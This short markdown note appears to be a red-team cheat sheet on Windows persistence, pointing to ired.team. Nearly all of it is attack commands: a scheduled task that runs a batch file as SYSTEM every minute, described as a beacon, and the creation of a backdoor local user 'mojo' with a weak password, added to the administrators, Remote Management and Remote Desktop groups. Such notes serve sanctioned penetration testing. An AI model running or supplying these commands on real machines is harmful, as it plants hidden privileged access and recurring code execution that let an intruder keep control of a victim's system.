# Persistence

See [ired.team](https://www.ired.team/offensive-security/persistence)

```powershell
# Add a beacon that pings every minute
schtasks /create /sc minute /mo 1 /tn "chillin" /tr C:\ProgramData\System\chillin.bat /ru "SYSTEM"

# Add an administrative user to establish persistence
net user mojo Password123! /add
net localgroup administrators mojo /add
net localgroup 'Remote Management Users' mojo /add
net localgroup 'Remote Desktop Users' mojo /add
```
